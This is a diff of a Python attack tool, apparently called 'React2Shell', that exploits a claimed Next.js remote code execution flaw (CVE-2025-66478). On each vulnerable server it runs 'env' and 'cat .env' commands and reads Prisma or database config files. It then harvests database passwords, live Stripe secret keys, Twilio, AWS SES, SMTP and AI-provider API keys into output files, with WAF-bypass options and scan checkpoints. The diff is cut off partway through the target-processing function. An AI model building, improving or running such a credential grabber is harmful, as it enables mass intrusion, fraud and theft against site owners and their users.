@@ -56,9 +56,11 @@ def print_banner():
                                                                  
                         React2Shell RCE - CVE-2025-66478
 {Colors.AMBER}{Colors.BOLD}
-               Automated ENV Grabber with Multi-Output
+               Next.js RSC Remote Code Execution Vulnerability
+               [ENHANCED] Automated Credential Extraction Mode
 {Colors.DARK_GREEN}
           Author: Bob Marley (https://github.com/khadafigans)
+          Enhanced: Automated ENV Grabber with Multi-Output
 {Colors.RESET}
     """
     print(banner)
@@ -275,343 +277,252 @@ async def exploit_rce(session, url, cmd, waf_bypass: bool = False, waf_bypass_si
 def parse_database_url(db_url: str) -> dict:
     """
     Parse database URL and extract components.
-    Supports formats like:
-    - postgresql://user:pass@host:port/dbname
-    - mysql://user:pass@host:port/dbname
-    - postgres://user:pass@host:port/dbname
-    - mongodb://user:pass@host:port/dbname
-    - sqlserver://user:pass@host:port/dbname
+    Enhanced to handle special characters in passwords and various formats.
     """
     result = {}
-    
     if not db_url:
         return result
     
     try:
-        # Determine connection type from URL scheme
-        if db_url.startswith('postgresql://') or db_url.startswith('postgres://'):
-            result['connection'] = 'postgresql'
-        elif db_url.startswith('mysql://'):
-            result['connection'] = 'mysql'
-        elif db_url.startswith('mongodb://') or db_url.startswith('mongodb+srv://'):
-            result['connection'] = 'mongodb'
-        elif db_url.startswith('sqlserver://') or db_url.startswith('mssql://'):
-            result['connection'] = 'sqlsrv'
-        elif db_url.startswith('sqlite://'):
-            result['connection'] = 'sqlite'
-        else:
-            # Try to extract from URL
-            match = re.match(r'^([a-zA-Z0-9+]+)://', db_url)
-            if match:
-                result['connection'] = match.group(1)
+        # 1. Manual Split for robust parsing (handles special chars in password better than urlparse)
+        if '://' in db_url:
+            scheme, rest = db_url.split('://', 1)
+            result['connection'] = scheme
+            
+            # Extract auth and server/path parts
+            if '@' in rest:
+                auth, server_part = rest.rsplit('@', 1)
+                # Parse user:pass
+                if ':' in auth:
+                    result['user'], result['password'] = auth.split(':', 1)
+                else:
+                    result['user'] = auth
+                
+                # Parse host:port/dbname
+                if '/' in server_part:
+                    host_port, path = server_part.split('/', 1)
+                    result['name'] = path.split('?')[0]
+                    if ':' in host_port:
+                        result['host'], result['port'] = host_port.split(':', 1)
+                    else:
+                        result['host'] = host_port
+                else:
+                    if ':' in server_part:
+                        result['host'], result['port'] = server_part.split(':', 1)
+                    else:
+                        result['host'] = server_part
+            else:
+                # No @, could be just host:port/name or file:path
+                if '/' in rest:
+                    host_port, path = rest.split('/', 1)
+                    result['name'] = path.split('?')[0]
+                    if ':' in host_port:
+                        result['host'], result['port'] = host_port.split(':', 1)
+                    else:
+                        result['host'] = host_port
         
-        # Parse the URL
-        # Handle special case for postgres with pooler URLs
+        # 2. Fallback to standard urlparse for anything missed
         parsed = urllib.parse.urlparse(db_url)
-        
-        # Extract user and password
-        if parsed.username:
+        if parsed.scheme and not result.get('connection'):
+            result['connection'] = parsed.scheme
+        if parsed.username and not result.get('user'):
             result['user'] = urllib.parse.unquote(parsed.username)
-        if parsed.password:
+        if parsed.password and not result.get('password'):
             result['password'] = urllib.parse.unquote(parsed.password)
-        
-        # Extract host
-        if parsed.hostname:
+        if parsed.hostname and not result.get('host'):
             result['host'] = parsed.hostname
-        
-        # Extract port
-        if parsed.port:
+        if parsed.port and not result.get('port'):
             result['port'] = str(parsed.port)
-        
-        # Extract database name from path
-        if parsed.path and parsed.path != '/':
-            db_name = parsed.path.lstrip('/')
-            # Handle query parameters in path
-            if '?' in db_name:
-                db_name = db_name.split('?')[0]
-            result['name'] = db_name
-        
-    except Exception as e:
+        if parsed.path and parsed.path != '/' and not result.get('name'):
+            result['name'] = parsed.path.lstrip('/').split('?')[0]
+            
+    except Exception:
         pass
     
     return result
 
 # ==================== CREDENTIAL EXTRACTION ====================
 
-def parse_env_content(content: str) -> dict:
-    """Parse .env file content into key-value pairs"""
-    env_vars = {}
+def parse_env_content(content: str) -> list:
+    """Parse .env content into a list of key-value pairs, including comments."""
+    results = []
     for line in content.split('\n'):
         line = line.strip()
-        if not line or line.startswith('#'):
-            continue
-        if '=' in line:
-            key, _, value = line.partition('=')
+        if not line: continue
+        
+        # Handle commented lines by stripping the leading # for parsing
+        is_commented = line.startswith('#')
+        clean_line = line.lstrip('#').strip()
+        
+        if '=' in clean_line:
+            key, _, value = clean_line.partition('=')
             key = key.strip()
             value = value.strip().strip('"').strip("'")
-            env_vars[key] = value
-    return env_vars
+            if key:
+                results.append({'key': key, 'value': value, 'commented': is_commented})
+    return results
 
-def extract_db_credentials(env_vars: dict, url: str) -> dict:
-    """Extract database credentials with DB_URL parsing"""
-    db_info = {'url': url}
-    
-    # First check for DATABASE_URL and parse it
-    db_url_keys = ['DATABASE_URL', 'DB_URL', 'MYSQL_URL', 'POSTGRES_URL', 'PG_URL', 'MONGODB_URI', 'MONGO_URL']
-    db_url_value = None
-    for key in db_url_keys:
-        if key in env_vars:
-            db_url_value = env_vars[key]
-            db_info['db_url'] = db_url_value
-            break
-    
-    # Parse DB_URL if found
-    if db_url_value:
-        parsed = parse_database_url(db_url_value)
-        # Fill in parsed values (these can be overridden by explicit env vars below)
-        if 'connection' in parsed:
-            db_info['connection'] = parsed['connection']
-        if 'host' in parsed:
-            db_info['host'] = parsed['host']
-        if 'port' in parsed:
-            db_info['port'] = parsed['port']
-        if 'user' in parsed:
-            db_info['user'] = parsed['user']
-        if 'password' in parsed:
-            db_info['password'] = parsed['password']
-        if 'name' in parsed:
-            db_info['name'] = parsed['name']
-    
-    # Override with explicit env vars if present
-    db_connection_keys = ['DB_CONNECTION', 'DATABASE_CONNECTION', 'DB_DRIVER', 'DATABASE_DRIVER']
-    for key in db_connection_keys:
-        if key in env_vars:
-            db_info['connection'] = env_vars[key]
-            break
-    
-    db_host_keys = ['DB_HOST', 'DATABASE_HOST', 'MYSQL_HOST', 'POSTGRES_HOST', 'PG_HOST']
-    for key in db_host_keys:
-        if key in env_vars:
-            db_info['host'] = env_vars[key]
-            break
-    
-    db_port_keys = ['DB_PORT', 'DATABASE_PORT', 'MYSQL_PORT', 'POSTGRES_PORT', 'PG_PORT']
-    for key in db_port_keys:
-        if key in env_vars:
-            db_info['port'] = env_vars[key]
-            break
-    
-    db_user_keys = ['DB_USER', 'DB_USERNAME', 'DATABASE_USER', 'DATABASE_USERNAME', 'MYSQL_USER', 'POSTGRES_USER', 'PG_USER']
-    for key in db_user_keys:
-        if key in env_vars:
-            db_info['user'] = env_vars[key]
-            break
-    
-    db_pass_keys = ['DB_PASS', 'DB_PASSWORD', 'DATABASE_PASS', 'DATABASE_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'PG_PASSWORD']
-    for key in db_pass_keys:
-        if key in env_vars:
-            db_info['password'] = env_vars[key]
-            break
-    
-    db_name_keys = ['DB_NAME', 'DB_DATABASE', 'DATABASE_NAME', 'DATABASE', 'MYSQL_DATABASE', 'POSTGRES_DB', 'PG_DATABASE']
-    for key in db_name_keys:
-        if key in env_vars:
-            db_info['name'] = env_vars[key]
-            break
-    
-    return db_info if len(db_info) > 1 else None
+def extract_db_credentials(parsed_vars: list, url: str) -> list:
+    """Extract database credentials from parsed variables."""
+    db_results = []
+    url_keys = {'DATABASE_URL', 'DB_URL', 'MYSQL_URL', 'POSTGRES_URL', 'PG_URL', 'MONGODB_URI', 'MONGO_URL'}
+    conn_keys = {'DB_CONNECTION', 'DATABASE_CONNECTION', 'DB_DRIVER', 'DATABASE_DRIVER'}
+    host_keys = {'DB_HOST', 'DATABASE_HOST', 'MYSQL_HOST', 'POSTGRES_HOST', 'PG_HOST'}
+    port_keys = {'DB_PORT', 'DATABASE_PORT', 'MYSQL_PORT', 'POSTGRES_PORT', 'PG_PORT'}
+    user_keys = {'DB_USER', 'DB_USERNAME', 'DATABASE_USER', 'DATABASE_USERNAME', 'MYSQL_USER', 'POSTGRES_USER', 'PG_USER'}
+    pass_keys = {'DB_PASS', 'DB_PASSWORD', 'DATABASE_PASS', 'DATABASE_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD', 'PG_PASSWORD'}
+    name_keys = {'DB_NAME', 'DB_DATABASE', 'DATABASE_NAME', 'DATABASE', 'MYSQL_DATABASE', 'POSTGRES_DB', 'PG_DATABASE'}
 
-def extract_stripe_keys(env_vars: dict, url: str) -> dict:
+    seen_urls = set()
+    for item in parsed_vars:
+        if item['key'] in url_keys:
+            val = item['value']
+            if val and val not in seen_urls:
+                info = parse_database_url(val)
+                info['url'] = url
+                info['db_url'] = val
+                info['commented'] = item['commented']
+                
+                db_name = info.get('name', '')
+                is_local = (val.startswith('file:') or '.db' in val or 'sqlite' in val) or (db_name and ('.db' in db_name or '/' in db_name))
+                has_remote = info.get('host') or info.get('user') or info.get('password')
+                
+                if not is_local or has_remote:
+                    db_results.append(info)
+                    seen_urls.add(val)
+
+    if not db_results:
+        info = {'url': url}
+        for item in parsed_vars:
+            k, v = item['key'], item['value']
+            if not v: continue
+            if k in host_keys and 'host' not in info: info['host'] = v
+            if k in user_keys and 'user' not in info: info['user'] = v
+            if k in pass_keys and 'password' not in info: info['password'] = v
+            if k in name_keys and 'name' not in info: info['name'] = v
+            if k in port_keys and 'port' not in info: info['port'] = v
+            if k in conn_keys and 'connection' not in info: info['connection'] = v
+        
+        if len(info) > 1:
+            db_results.append(info)
+
+    return db_results
+
+def extract_stripe_keys(parsed_vars: list, url: str) -> list:
     """Extract Stripe keys - sk_live_ only"""
-    stripe_info = {'url': url}
-    
-    stripe_keys = ['STRIPE_SECRET', 'STRIPE_SECRET_KEY', 'STRIPE_SK', 'STRIPE_API_KEY', 'STRIPE_LIVE_SECRET_KEY']
-    for key in stripe_keys:
-        if key in env_vars:
-            value = env_vars[key]
-            if value.startswith('sk_live_'):
-                stripe_info['secret'] = value
-                return stripe_info
-    
-    # Also check for any key containing stripe and sk_live_
-    for key, value in env_vars.items():
-        if 'stripe' in key.lower() and value.startswith('sk_live_'):
-            stripe_info['secret'] = value
-            return stripe_info
-    
-    return None
+    found = []
+    seen = set()
+    for item in parsed_vars:
+        k, v = item['key'], item['value']
+        if v.startswith('sk_live_') and v not in seen:
+            found.append({'url': url, 'secret': v, 'commented': item['commented']})
+            seen.add(v)
+        elif 'stripe' in k.lower() and v.startswith('sk_live_') and v not in seen:
+            found.append({'url': url, 'secret': v, 'commented': item['commented']})
+            seen.add(v)
+    return found
 
-def extract_twilio_credentials(env_vars: dict, url: str) -> dict:
+def extract_twilio_credentials(parsed_vars: list, url: str) -> list:
     """Extract Twilio credentials"""
-    twilio_info = {'url': url}
+    found = []
+    sids = [i for i in parsed_vars if i['key'] in {'TWILIO_ACCOUNT_SID', 'TWILIO_SID', 'TWILIO_ACCOUNT_ID'}]
+    tokens = [i for i in parsed_vars if i['key'] in {'TWILIO_API_KEY', 'TWILIO_AUTH_TOKEN', 'TWILIO_TOKEN', 'TWILIO_API_SECRET'}]
+    numbers = [i for i in parsed_vars if i['key'] in {'TWILIO_NUMBER', 'TWILIO_PHONE_NUMBER'}]
     
-    # Account SID
-    sid_keys = ['TWILIO_ACCOUNT_SID', 'TWILIO_SID', 'TWILIO_ACCOUNT_ID']
-    for key in sid_keys:
-        if key in env_vars:
-            twilio_info['account_sid'] = env_vars[key]
-            break
-    
-    # API Key / Auth Token
-    api_keys = ['TWILIO_API_KEY', 'TWILIO_AUTH_TOKEN', 'TWILIO_TOKEN', 'TWILIO_API_SECRET']
-    for key in api_keys:
-        if key in env_vars:
-            twilio_info['api_key'] = env_vars[key]
-            break
-    
-    # Phone Number
-    number_keys = ['TWILIO_NUMBER', 'TWILIO_PHONE_NUMBER', 'TWILIO_FROM_NUMBER', 'TWILIO_PHONE']
-    for key in number_keys:
-        if key in env_vars:
-            twilio_info['number'] = env_vars[key]
-            break
-    
-    return twilio_info if 'account_sid' in twilio_info or 'api_key' in twilio_info else None
+    for s in sids:
+        for t in tokens:
+            if s['commented'] == t['commented']:
+                info = {
+                    'url': url,
+                    'account_sid': s['value'],
+                    'api_key': t['value'],
+                    'number': '',
+                    'commented': s['commented']
+                }
+                for n in numbers:
+                    if n['commented'] == s['commented']:
+                        info['number'] = n['value']
+                        break
+                found.append(info)
+    return found
 
-def extract_ai_keys(env_vars: dict, url: str) -> list:
-    """Extract AI API keys (OpenAI, Gemini, Anthropic, Grok, DeepSeek)"""
+def extract_ai_keys(parsed_vars: list, url: str) -> list:
+    """Extract AI API keys"""
     ai_keys = []
+    seen = set()
     
-    # OpenAI
-    openai_keys = ['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_SECRET_KEY']
-    for key in openai_keys:
-        if key in env_vars:
-            value = env_vars[key]
-            if value.startswith('sk-'):
-                ai_keys.append({'url': url, 'type': 'OPEN-AI', 'key': value})
-            break
+    mapping = {
+        'OPEN-AI': (['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_SECRET_KEY'], 'sk-'),
+        'GEMINI': (['GEMINI_API_KEY', 'GOOGLE_AI_KEY', 'GOOGLE_API_KEY', 'GEMINI_KEY'], ''),
+        'ANTHROPIC': (['ANTHROPIC_API_KEY', 'CLAUDE_API_KEY', 'ANTHROPIC_KEY'], 'sk-ant-'),
+        'GROK': (['GROK_API_KEY', 'XAI_API_KEY', 'GROK_KEY'], 'xai-'),
+        'DEEPSEEK': (['DEEPSEEK_API_KEY', 'DEEPSEEK_KEY'], 'sk-')
+    }
     
-    # Gemini / Google AI
-    gemini_keys = ['GEMINI_API_KEY', 'GOOGLE_AI_KEY', 'GOOGLE_API_KEY', 'GEMINI_KEY']
-    for key in gemini_keys:
-        if key in env_vars:
-            ai_keys.append({'url': url, 'type': 'GEMINI', 'key': env_vars[key]})
-            break
-    
-    # Anthropic / Claude
-    anthropic_keys = ['ANTHROPIC_API_KEY', 'CLAUDE_API_KEY', 'ANTHROPIC_KEY']
-    for key in anthropic_keys:
-        if key in env_vars:
-            ai_keys.append({'url': url, 'type': 'ANTHROPIC', 'key': env_vars[key]})
-            break
-    
-    # Grok / xAI
-    grok_keys = ['GROK_API_KEY', 'XAI_API_KEY', 'GROK_KEY']
-    for key in grok_keys:
-        if key in env_vars:
-            ai_keys.append({'url': url, 'type': 'GROK', 'key': env_vars[key]})
-            break
-    
-    # DeepSeek
-    deepseek_keys = ['DEEPSEEK_API_KEY', 'DEEPSEEK_KEY']
-    for key in deepseek_keys:
-        if key in env_vars:
-            ai_keys.append({'url': url, 'type': 'DEEPSEEK', 'key': env_vars[key]})
-            break
-    
-    return ai_keys if ai_keys else None
-
-def extract_aws_ses(env_vars: dict, url: str) -> dict:
-    """Extract AWS SES credentials"""
-    ses_info = {'url': url}
-    
-    # SES Host
-    host_keys = ['SES_HOST', 'AWS_SES_HOST', 'MAIL_HOST', 'SMTP_HOST']
-    for key in host_keys:
-        if key in env_vars:
-            value = env_vars[key]
-            if 'amazonaws.com' in value or 'email-smtp' in value:
-                ses_info['host'] = value
+    for item in parsed_vars:
+        k, v = item['key'], item['value']
+        if not v or v in seen: continue
+        
+        for type_name, (keys, prefix) in mapping.items():
+            if k in keys and v.startswith(prefix):
+                ai_keys.append({'url': url, 'type': type_name, 'key': v, 'commented': item['commented']})
+                seen.add(v)
                 break
-    
-    # SES Region
-    region_keys = ['SES_REGION', 'AWS_SES_REGION', 'AWS_REGION', 'AWS_DEFAULT_REGION']
-    for key in region_keys:
-        if key in env_vars:
-            ses_info['region'] = env_vars[key]
-            break
-    
-    # Access Key ID
-    access_keys = ['SES_ACCESS_KEY_ID', 'AWS_ACCESS_KEY_ID', 'AWS_ACCESS_KEY', 'SES_KEY', 'MAIL_USERNAME']
-    for key in access_keys:
-        if key in env_vars:
-            value = env_vars[key]
-            if value.startswith('AKIA') or 'SES' in key.upper():
-                ses_info['access_key_id'] = value
-                break
-    
-    # Secret Access Key
-    secret_keys = ['SES_SECRET_ACCESS_KEY', 'AWS_SECRET_ACCESS_KEY', 'AWS_SECRET_KEY', 'SES_SECRET', 'MAIL_PASSWORD']
-    for key in secret_keys:
-        if key in env_vars:
-            ses_info['secret_access_key'] = env_vars[key]
-            break
-    
-    # From Email
-    from_email_keys = ['SES_FROM_EMAIL', 'AWS_SES_FROM_EMAIL', 'MAIL_FROM_ADDRESS', 'MAIL_FROM']
-    for key in from_email_keys:
-        if key in env_vars:
-            ses_info['from_email'] = env_vars[key]
-            break
-    
-    # From Name
-    from_name_keys = ['SES_FROM_NAME', 'AWS_SES_FROM_NAME', 'MAIL_FROM_NAME']
-    for key in from_name_keys:
-        if key in env_vars:
-            ses_info['from_name'] = env_vars[key]
-            break
-    
-    # Only return if we have SES-specific keys (not just generic SMTP)
-    if 'access_key_id' in ses_info or ('host' in ses_info and 'amazonaws' in ses_info.get('host', '')):
-        return ses_info
-    return None
+    return ai_keys
 
-def extract_smtp(env_vars: dict, url: str) -> dict:
-    """Extract SMTP credentials"""
-    smtp_info = {'url': url}
+def extract_aws_ses(parsed_vars: list, url: str) -> list:
+    found = []
+    seen = set()
     
-    # SMTP Host
-    host_keys = ['SMTP_HOST', 'MAIL_HOST', 'EMAIL_HOST', 'SMTP_SERVER', 'MAIL_SERVER']
-    for key in host_keys:
-        if key in env_vars:
-            smtp_info['host'] = env_vars[key]
-            break
+    # Simple check for AKIA
+    for item in parsed_vars:
+        v = item['value']
+        if v.startswith('AKIA') and v not in seen:
+            info = {
+                'url': url,
+                'access_key_id': v,
+                'commented': item['commented'],
+                'host': '', 'region': '', 'secret_access_key': '', 'from_email': '', 'from_name': ''
+            }
+            # Look for related keys with same commented status
+            for sub in parsed_vars:
+                if sub['commented'] == item['commented']:
+                    sk, sv = sub['key'], sub['value']
+                    if sk in ['SES_SECRET_ACCESS_KEY', 'AWS_SECRET_ACCESS_KEY', 'AWS_SECRET_KEY', 'SES_SECRET', 'MAIL_PASSWORD']: info['secret_access_key'] = sv
+                    if sk in ['SES_HOST', 'AWS_SES_HOST', 'MAIL_HOST', 'SMTP_HOST'] and ('amazonaws' in sv or 'email-smtp' in sv): info['host'] = sv
+                    if sk in ['SES_REGION', 'AWS_SES_REGION', 'AWS_REGION', 'AWS_DEFAULT_REGION']: info['region'] = sv
+                    if sk in ['SES_FROM_EMAIL', 'AWS_SES_FROM_EMAIL', 'MAIL_FROM_ADDRESS', 'MAIL_FROM']: info['from_email'] = sv
+                    if sk in ['SES_FROM_NAME', 'AWS_SES_FROM_NAME', 'MAIL_FROM_NAME']: info['from_name'] = sv
+            found.append(info)
+            seen.add(v)
+    return found
+
+def extract_smtp(parsed_vars: list, url: str) -> list:
+    found = []
+    hosts = [i for i in parsed_vars if i['key'] in {'SMTP_HOST', 'MAIL_HOST', 'EMAIL_HOST', 'SMTP_SERVER', 'MAIL_SERVER'}]
+    users = [i for i in parsed_vars if i['key'] in {'SMTP_USERNAME', 'SMTP_USER', 'MAIL_USERNAME', 'MAIL_USER', 'EMAIL_USER', 'EMAIL_USERNAME'}]
     
-    # SMTP Port
-    port_keys = ['SMTP_PORT', 'MAIL_PORT', 'EMAIL_PORT']
-    for key in port_keys:
-        if key in env_vars:
-            smtp_info['port'] = env_vars[key]
-            break
-    
-    # SMTP Username
-    user_keys = ['SMTP_USERNAME', 'SMTP_USER', 'MAIL_USERNAME', 'MAIL_USER', 'EMAIL_USER', 'EMAIL_USERNAME']
-    for key in user_keys:
-        if key in env_vars:
-            smtp_info['username'] = env_vars[key]
-            break
-    
-    # SMTP Password
-    pass_keys = ['SMTP_PASSWORD', 'SMTP_PASS', 'MAIL_PASSWORD', 'MAIL_PASS', 'EMAIL_PASSWORD', 'EMAIL_PASS']
-    for key in pass_keys:
-        if key in env_vars:
-            smtp_info['password'] = env_vars[key]
-            break
-    
-    # From Email
-    from_keys = ['SMTP_FROM_MAIL', 'SMTP_FROM', 'MAIL_FROM', 'MAIL_FROM_ADDRESS', 'EMAIL_FROM']
-    for key in from_keys:
-        if key in env_vars:
-            smtp_info['from_mail'] = env_vars[key]
-            break
-    
-    return smtp_info if 'host' in smtp_info or 'username' in smtp_info else None
+    for h in hosts:
+        for u in users:
+            if h['commented'] == u['commented']:
+                info = {
+                    'url': url, 'host': h['value'], 'username': u['value'], 'commented': h['commented'],
+                    'port': '', 'password': '', 'from_mail': ''
+                }
+                for sub in parsed_vars:
+                    if sub['commented'] == h['commented']:
+                        sk, sv = sub['key'], sub['value']
+                        if sk in ['SMTP_PORT', 'MAIL_PORT', 'EMAIL_PORT']: info['port'] = sv
+                        if sk in ['SMTP_PASSWORD', 'SMTP_PASS', 'MAIL_PASSWORD', 'MAIL_PASS', 'EMAIL_PASSWORD', 'EMAIL_PASS']: info['password'] = sv
+                        if sk in ['SMTP_FROM_MAIL', 'SMTP_FROM', 'MAIL_FROM', 'MAIL_FROM_ADDRESS', 'EMAIL_FROM']: info['from_mail'] = sv
+                found.append(info)
+    return found
 
 # ==================== OUTPUT FORMATTERS ====================
 
 def format_db_output(db_info: dict) -> str:
-    """Format database credentials output"""
     lines = [f"URL: {db_info.get('url', '')}"]
+    if db_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"DB_CONNECTION: {db_info.get('connection', '')}")
     lines.append(f"DB_HOST: {db_info.get('host', '')}")
     lines.append(f"DB_PORT: {db_info.get('port', '')}")
@@ -622,29 +533,29 @@ def format_db_output(db_info: dict) -> str:
     return '\n'.join(lines) + '\n\n'
 
 def format_stripe_output(stripe_info: dict) -> str:
-    """Format Stripe key output"""
     lines = [f"URL: {stripe_info.get('url', '')}"]
+    if stripe_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"STRIPE_SECRET: {stripe_info.get('secret', '')}")
     return '\n'.join(lines) + '\n\n'
 
 def format_twilio_output(twilio_info: dict) -> str:
-    """Format Twilio credentials output"""
     lines = [f"URL: {twilio_info.get('url', '')}"]
+    if twilio_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"TWILIO_ACCOUNT_SID: {twilio_info.get('account_sid', '')}")
     lines.append(f"TWILIO_API_KEY: {twilio_info.get('api_key', '')}")
     lines.append(f"TWILIO_NUMBER: {twilio_info.get('number', '')}")
     return '\n'.join(lines) + '\n\n'
 
 def format_ai_key_output(ai_info: dict) -> str:
-    """Format AI key output"""
     lines = [f"URL: {ai_info.get('url', '')}"]
+    if ai_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"TYPE: {ai_info.get('type', '')}")
     lines.append(f"KEY: {ai_info.get('key', '')}")
     return '\n'.join(lines) + '\n\n'
 
 def format_ses_output(ses_info: dict) -> str:
-    """Format AWS SES output"""
     lines = [f"URL: {ses_info.get('url', '')}"]
+    if ses_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"SES_HOST: {ses_info.get('host', '')}")
     lines.append(f"SES_REGION: {ses_info.get('region', '')}")
     lines.append(f"SES_ACCESS_KEY_ID: {ses_info.get('access_key_id', '')}")
@@ -654,8 +565,8 @@ def format_ses_output(ses_info: dict) -> str:
     return '\n'.join(lines) + '\n\n'
 
 def format_smtp_output(smtp_info: dict) -> str:
-    """Format SMTP output"""
     lines = [f"URL: {smtp_info.get('url', '')}"]
+    if smtp_info.get('commented'): lines.append("STATUS: [COMMENTED/DISABLED]")
     lines.append(f"SMTP_HOST: {smtp_info.get('host', '')}")
     lines.append(f"SMTP_PORT: {smtp_info.get('port', '')}")
     lines.append(f"SMTP_USERNAME: {smtp_info.get('username', '')}")
@@ -663,307 +574,203 @@ def format_smtp_output(smtp_info: dict) -> str:
     lines.append(f"SMTP_FROM_MAIL: {smtp_info.get('from_mail', '')}")
     return '\n'.join(lines) + '\n\n'
 
-# ==================== MAIN EXTRACTION LOGIC ====================
+# ==================== MAIN LOGIC ====================
 
 async def grab_env_files(session, url, waf_bypass=False, waf_bypass_size_kb=128, unicode_encode=False):
-    """Grab .env, .env.local, .env.production files"""
-    env_files = ['.env', '.env.local', '.env.production', '.env.development']
     all_env_content = ""
-    
+    success, output = await exploit_rce(session, url, "env", waf_bypass, waf_bypass_size_kb, unicode_encode)
+    if success and output and output != "No output": all_env_content += output + "\n"
+
+    env_files = ['.env', '.env.local', '.env.production', '.env.development']
     for env_file in env_files:
         cmd = f"cat {env_file} 2>/dev/null || cat ../{env_file} 2>/dev/null || cat ../../{env_file} 2>/dev/null"
-        success, output = await exploit_rce(session, url, cmd, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, unicode_encode=unicode_encode)
+        success, output = await exploit_rce(session, url, cmd, waf_bypass, waf_bypass_size_kb, unicode_encode)
         if success and output and output != "No output" and "No such file" not in output:
             all_env_content += output + "\n"
-    
     return all_env_content
 
 async def process_target(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode, output_files, stats, lock):
-    """Process a single target and extract credentials"""
     global checkpoint_state
+    checkpoint_state['last_processed'] = url
+    checkpoint_state['processed_urls'].add(url)
     
-    result = {
-        'url': url,
-        'vulnerable': False,
-        'db': None,
-        'stripe': None,
-        'twilio': None,
-        'ai_keys': None,
-        'ses': None,
-        'smtp': None
+    if not await detect_safe(session, url):
+        print(f"{Colors.DIM}[-] {url} - Not vulnerable{Colors.RESET}")
+        return
+    
+    print(f"{Colors.BRIGHT_GREEN}[VULN] {url} - Vulnerable! Extracting credentials...{Colors.RESET}")
+    async with lock: stats['vuln'] += 1
+    
+    env_content = await grab_env_files(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode)
+    if not env_content: return
+    
+    parsed_vars = parse_env_content(env_content)
+    
+    results = {
+        'db': extract_db_credentials(parsed_vars, url),
+        'stripe': extract_stripe_keys(parsed_vars, url),
+        'twilio': extract_twilio_credentials(parsed_vars, url),
+        'ai': extract_ai_keys(parsed_vars, url),
+        'ses': extract_aws_ses(parsed_vars, url),
+        'smtp': extract_smtp(parsed_vars, url)
     }
+
+    # Fallback: If no DB found in env, hunt for Prisma/Config files
+    if not results['db']:
+        prisma_files = ['prisma/schema.prisma', 'schema.prisma', 'config/database.js', 'config/db.ts']
+        for p_file in prisma_files:
+            p_cmd = f"cat {p_file} 2>/dev/null || cat ../{p_file} 2>/dev/null"
+            p_success, p_output = await exploit_rce(session, url, p_cmd, waf_bypass, waf_bypass_size_kb, unicode_encode)
+            if p_success and p_output and "No such file" not in p_output:
+                db_url_match = re.search(r'url\s*=\s*["\']([^"\']+)["\']', p_output)
+                if db_url_match:
+                    p_db_url = db_url_match.group(1)
+                    if not p_db_url.startswith('env('):
+                        p_parsed = parse_database_url(p_db_url)
+                        p_parsed['url'] = url
+                        p_parsed['db_url'] = p_db_url
+                        if not (p_db_url.startswith('file:') or '.db' in p_db_url) or p_parsed.get('host'):
+                            results['db'] = [p_parsed]
+                            break
+
+    found_items = []
+    if results['db']:
+        with open(output_files['db'], 'a') as f:
+            for item in results['db']: f.write(format_db_output(item))
+        found_items.append(f"{Colors.CYAN}DATABASE{Colors.RESET}")
+        async with lock: stats['db'] += len(results['db'])
     
-    try:
-        # Update checkpoint state
-        checkpoint_state['last_processed'] = url
-        checkpoint_state['processed_urls'].add(url)
+    if results['stripe']:
+        with open(output_files['stripe'], 'a') as f:
+            for item in results['stripe']: f.write(format_stripe_output(item))
+        found_items.append(f"{Colors.MAGENTA}STRIPE{Colors.RESET}")
+        async with lock: stats['stripe'] += len(results['stripe'])
         
-        # First detect if vulnerable
-        if not await detect_safe(session, url):
-            print(f"{Colors.DIM}[-] {url} - Not vulnerable{Colors.RESET}")
-            return result
+    if results['twilio']:
+        with open(output_files['twilio'], 'a') as f:
+            for item in results['twilio']: f.write(format_twilio_output(item))
+        found_items.append(f"{Colors.BLUE}TWILIO{Colors.RESET}")
+        async with lock: stats['twilio'] += len(results['twilio'])
         
-        result['vulnerable'] = True
-        async with lock:
-            stats['vuln'] += 1
+    if results['ai']:
+        with open(output_files['ai'], 'a') as f:
+            for item in results['ai']: 
+                f.write(format_ai_key_output(item))
+                found_items.append(f"{Colors.GREEN}{item['type']}{Colors.RESET}")
+        async with lock: stats['ai'] += len(results['ai'])
         
-        print(f"{Colors.BRIGHT_GREEN}[VULN] {url} - Vulnerable! Extracting credentials...{Colors.RESET}")
+    if results['ses']:
+        with open(output_files['ses'], 'a') as f:
+            for item in results['ses']: f.write(format_ses_output(item))
+        found_items.append(f"{Colors.AMBER}AWS-SES{Colors.RESET}")
+        async with lock: stats['ses'] += len(results['ses'])
         
-        # Grab env files
-        env_content = await grab_env_files(session, url, waf_bypass, waf_bypass_size_kb, unicode_encode)
-        
-        if not env_content or env_content.strip() == "":
-            print(f"{Colors.YELLOW}  └── No .env files found{Colors.RESET}")
-            return result
-        
-        # Parse env content
-        env_vars = parse_env_content(env_content)
-        
-        if not env_vars:
-            print(f"{Colors.YELLOW}  └── Empty .env content{Colors.RESET}")
-            return result
-        
-        # Extract all credential types
-        result['db'] = extract_db_credentials(env_vars, url)
-        result['stripe'] = extract_stripe_keys(env_vars, url)
-        result['twilio'] = extract_twilio_credentials(env_vars, url)
-        result['ai_keys'] = extract_ai_keys(env_vars, url)
-        result['ses'] = extract_aws_ses(env_vars, url)
-        result['smtp'] = extract_smtp(env_vars, url)
-        
-        # Build found items list for CLI output
-        found_items = []
-        
-        # Write to output files and track what was found
-        if result['db']:
-            with open(output_files['db'], 'a') as f:
-                f.write(format_db_output(result['db']))
-            found_items.append(f"{Colors.CYAN}DB{Colors.RESET}")
-            async with lock:
-                stats['db'] += 1
-        
-        if result['stripe']:
-            with open(output_files['stripe'], 'a') as f:
-                f.write(format_stripe_output(result['stripe']))
-            found_items.append(f"{Colors.MAGENTA}STRIPE{Colors.RESET}")
-            async with lock:
-                stats['stripe'] += 1
-        
-        if result['twilio']:
-            with open(output_files['twilio'], 'a') as f:
